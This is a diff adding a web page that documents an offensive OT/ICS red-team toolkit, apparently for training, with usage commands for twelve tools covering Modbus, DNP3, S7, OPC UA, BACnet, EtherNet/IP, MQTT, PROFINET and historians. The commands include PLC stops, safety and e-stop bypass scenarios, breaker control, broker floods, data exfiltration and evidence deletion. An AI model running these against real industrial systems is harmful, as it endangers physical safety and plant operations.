@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="path-depth" content="0">
+    <title>Offensive Toolkit - VULNOT | Mjolnir Security</title>
+    <meta name="description" content="12 offensive OT/ICS security tools for red team exercises: Modbus, DNP3, S7comm, OPC UA, BACnet, EtherNet/IP, MQTT, PROFINET, and Historian attacks.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@200;300;400;500;600&family=IBM+Plex+Mono:wght@300;400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/dashboard-host.css">
+</head>
+<body>
+
+<div id="site-nav"></div>
+
+<div class="page-hero">
+    <div class="container">
+        <h1>Offensive <span class="accent-orange">Toolkit</span></h1>
+        <p class="tagline">12 purpose-built tools for OT/ICS red team exercises spanning 8 industrial protocols.</p>
+    </div>
+</div>
+
+<section>
+    <div class="container">
+
+        <!-- 1. vulnot-scan -->
+        <div class="tool-detail">
+            <h3>vulnot-scan</h3>
+            <span class="tool-proto">Modbus TCP</span>
+            <p>Multi-protocol OT network scanner. Discovers live hosts, enumerates Modbus unit IDs, fingerprints services, and detects industrial protocols across target subnets.</p>
+            <h4>Commands</h4>
+<pre>vulnot-scan --target 10.0.0.0/24
+vulnot-scan --target 10.0.1.10 --unit-ids 1-10
+vulnot-scan --protocol modbus --deep</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Network/subnet enumeration</li>
+                <li>Unit ID discovery</li>
+                <li>Service fingerprinting</li>
+                <li>Protocol detection</li>
+            </ul>
+        </div>
+
+        <!-- 2. vulnot-read -->
+        <div class="tool-detail">
+            <h3>vulnot-read</h3>
+            <span class="tool-proto">Modbus TCP</span>
+            <p>Register and coil reader. Dumps holding registers, reads coil states, queries input registers, and generates full register maps for reconnaissance.</p>
+            <h4>Commands</h4>
+<pre>vulnot-read modbus --host 10.0.1.10 --registers 0-100
+vulnot-read modbus --host 10.0.1.10 --coils 0-50
+vulnot-read modbus --host 10.0.1.10 --map</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Holding register dump</li>
+                <li>Coil status read</li>
+                <li>Input register read</li>
+                <li>Register map generation</li>
+            </ul>
+        </div>
+
+        <!-- 3. vulnot-write -->
+        <div class="tool-detail">
+            <h3>vulnot-write</h3>
+            <span class="tool-proto">Modbus TCP</span>
+            <p>Register writer with attack scenarios. Writes arbitrary values to holding registers and coils, and includes pre-built attack scenarios for overflow, setpoint manipulation, logic disruption, and safety bypass.</p>
+            <h4>Commands</h4>
+<pre>vulnot-write modbus --host 10.0.1.10 --reg 100 --val 999
+vulnot-write modbus --host 10.0.1.10 --coil 5 --val 1
+vulnot-write modbus --scenario overflow
+vulnot-write modbus --scenario setpoint-manipulation</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Single/multi register write</li>
+                <li>Coil forcing</li>
+                <li>4 attack scenarios (overflow, setpoint manipulation, logic disruption, safety bypass)</li>
+            </ul>
+        </div>
+
+        <!-- 4. vulnot-monitor -->
+        <div class="tool-detail">
+            <h3>vulnot-monitor</h3>
+            <span class="tool-proto">Modbus TCP</span>
+            <p>Real-time process monitoring dashboard. Provides a live view of register values, detects changes, raises threshold alerts, and tracks historical trends for process data analysis.</p>
+            <h4>Commands</h4>
+<pre>vulnot-monitor --host 10.0.1.10 --dashboard
+vulnot-monitor --host 10.0.1.10 --watch 0-50 --interval 1s
+vulnot-monitor --host 10.0.1.10 --alert --threshold 500</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Real-time process dashboard</li>
+                <li>Register change detection</li>
+                <li>Threshold alerting</li>
+                <li>Historical trending</li>
+            </ul>
+        </div>
+
+        <!-- 5. vulnot-dnp3 -->
+        <div class="tool-detail">
+            <h3>vulnot-dnp3</h3>
+            <span class="tool-proto">DNP3 :20000</span>
+            <p>DNP3 outstation control. Discovers outstations, operates breaker points, issues cold restart commands, and performs direct-operate bypassing the select-before-operate sequence.</p>
+            <h4>Commands</h4>
+<pre>vulnot-dnp3 --host 10.0.2.10 --scan
+vulnot-dnp3 --host 10.0.2.10 --operate --point 1 --value CLOSE
+vulnot-dnp3 --host 10.0.2.10 --cold-restart
+vulnot-dnp3 --host 10.0.2.10 --direct-operate --bypass-select</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Outstation discovery</li>
+                <li>Breaker control (open/close)</li>
+                <li>Cold restart command</li>
+                <li>Direct operate without select</li>
+            </ul>
+        </div>
+
+        <!-- 6. vulnot-s7 -->
+        <div class="tool-detail">
+            <h3>vulnot-s7</h3>
+            <span class="tool-proto">S7comm :102</span>
+            <p>Siemens S7 PLC interaction. Extracts CPU information, reads and writes data blocks, controls CPU run state, and lists program blocks on target PLCs.</p>
+            <h4>Commands</h4>
+<pre>vulnot-s7 --host 10.0.3.10 --info
+vulnot-s7 --host 10.0.3.10 --read-db 1 --offset 0 --size 100
+vulnot-s7 --host 10.0.3.10 --write-db 1 --offset 10 --value 0xFF
+vulnot-s7 --host 10.0.3.10 --stop</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>CPU info extraction</li>
+                <li>Data block read/write</li>
+                <li>CPU stop/start</li>
+                <li>Program block listing</li>
+            </ul>
+        </div>
+
+        <!-- 7. vulnot-opcua -->
+        <div class="tool-detail">
+            <h3>vulnot-opcua</h3>
+            <span class="tool-proto">OPC UA :4840</span>
+            <p>OPC UA node manipulation. Browses the node tree, reads and writes node values, invokes server methods, and enumerates security policies on OPC UA endpoints.</p>
+            <h4>Commands</h4>
+<pre>vulnot-opcua --host 10.0.4.10 --browse
+vulnot-opcua --host 10.0.4.10 --read ns=2;s=Temperature
+vulnot-opcua --host 10.0.4.10 --write ns=2;s=Setpoint --value 999.9
+vulnot-opcua --host 10.0.4.10 --call ns=2;s=EmergencyStop</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Node tree browsing</li>
+                <li>Value read/write</li>
+                <li>Method calls</li>
+                <li>Security policy enumeration</li>
+            </ul>
+        </div>
+
+        <!-- 8. vulnot-bacnet -->
+        <div class="tool-detail">
+            <h3>vulnot-bacnet</h3>
+            <span class="tool-proto">BACnet :47808</span>
+            <p>BACnet object manipulation. Discovers devices via Who-Is/I-Am, reads and writes BACnet objects, and includes pre-built scenarios for building automation attacks.</p>
+            <h4>Commands</h4>
+<pre>vulnot-bacnet --discover
+vulnot-bacnet --host 10.0.5.10 --read analog-value 1
+vulnot-bacnet --host 10.0.5.10 --write analog-value 1 --value 120
+vulnot-bacnet --host 10.0.5.10 --scenario hvac-override</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Who-Is/I-Am discovery</li>
+                <li>Object read/write</li>
+                <li>4 scenarios (HVAC override, fire alarm, access control, energy waste)</li>
+            </ul>
+        </div>
+
+        <!-- 9. vulnot-enip -->
+        <div class="tool-detail">
+            <h3>vulnot-enip</h3>
+            <span class="tool-proto">EtherNet/IP :44818</span>
+            <p>CIP tag manipulation. Lists and enumerates controller tags, reads and writes tag values, and includes attack scenarios targeting packaging and conveyor systems.</p>
+            <h4>Commands</h4>
+<pre>vulnot-enip --host 10.0.6.10 --list-tags
+vulnot-enip --host 10.0.6.10 --read ConveyorSpeed
+vulnot-enip --host 10.0.6.10 --write ConveyorSpeed --value 999
+vulnot-enip --host 10.0.6.10 --scenario conveyor-overrun</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Tag listing/enumeration</li>
+                <li>Tag read/write</li>
+                <li>4 scenarios (conveyor overrun, label mismatch, fill overflow, emergency stop)</li>
+            </ul>
+        </div>
+
+        <!-- 10. vulnot-mqtt -->
+        <div class="tool-detail">
+            <h3>vulnot-mqtt</h3>
+            <span class="tool-proto">MQTT :1883</span>
+            <p>MQTT topic hijacking. Sniffs all topics on a broker, publishes arbitrary messages, hijacks control topics, and performs denial-of-service flood testing against MQTT brokers.</p>
+            <h4>Commands</h4>
+<pre>vulnot-mqtt --broker 10.0.7.5 --sniff "#"
+vulnot-mqtt --broker 10.0.7.5 --publish factory/sensor/temp --payload '{"value":999}'
+vulnot-mqtt --broker 10.0.7.5 --hijack factory/control/#
+vulnot-mqtt --broker 10.0.7.5 --dos --flood</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Topic sniffing/enumeration</li>
+                <li>Message publish/injection</li>
+                <li>Topic hijacking</li>
+                <li>Broker DoS testing</li>
+            </ul>
+        </div>
+
+        <!-- 11. vulnot-historian -->
+        <div class="tool-detail">
+            <h3>vulnot-historian</h3>
+            <span class="tool-proto">HTTP :8553</span>
+            <p>Historian data manipulation. Exfiltrates full tag databases, injects false data with backdated timestamps, deletes evidence from time-series records, and exploits SQL injection on tag queries.</p>
+            <h4>Commands</h4>
+<pre>vulnot-historian --host 10.0.9.10 --dump --tags all
+vulnot-historian --host 10.0.9.10 --inject --tag Water.pH --value 7.0 --timestamp "2024-01-01"
+vulnot-historian --host 10.0.9.10 --delete --tag Water.pH --range "last 24h"
+vulnot-historian --host 10.0.9.10 --exfil --output data.csv</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Full data exfiltration</li>
+                <li>False data injection with backdating</li>
+                <li>Evidence deletion</li>
+                <li>SQL injection on tag databases</li>
+            </ul>
+        </div>
+
+        <!-- 12. vulnot-profinet -->
+        <div class="tool-detail">
+            <h3>vulnot-profinet</h3>
+            <span class="tool-proto">PROFINET :34964</span>
+            <p>PROFINET drive control. Discovers PROFINET devices, reads and writes drive parameters, manipulates spindle and axis speeds, and includes scenarios for CNC motion control attacks.</p>
+            <h4>Commands</h4>
+<pre>vulnot-profinet --host 10.0.8.10 --discover
+vulnot-profinet --host 10.0.8.10 --read-params
+vulnot-profinet --host 10.0.8.10 --write-speed 12000
+vulnot-profinet --host 10.0.8.10 --scenario spindle-overspeed</pre>
+            <h4>Key Features</h4>
+            <ul>
+                <li>Device discovery/identification</li>
+                <li>Parameter read/write</li>
+                <li>Drive speed manipulation</li>
+                <li>4 scenarios (spindle overspeed, axis drift, tool change, e-stop bypass)</li>
+            </ul>
+        </div>
+
+    </div>
+</section>
+
+<div id="site-footer"></div>
+
+<script src="js/components.js"></script>
+</body>
+</html>
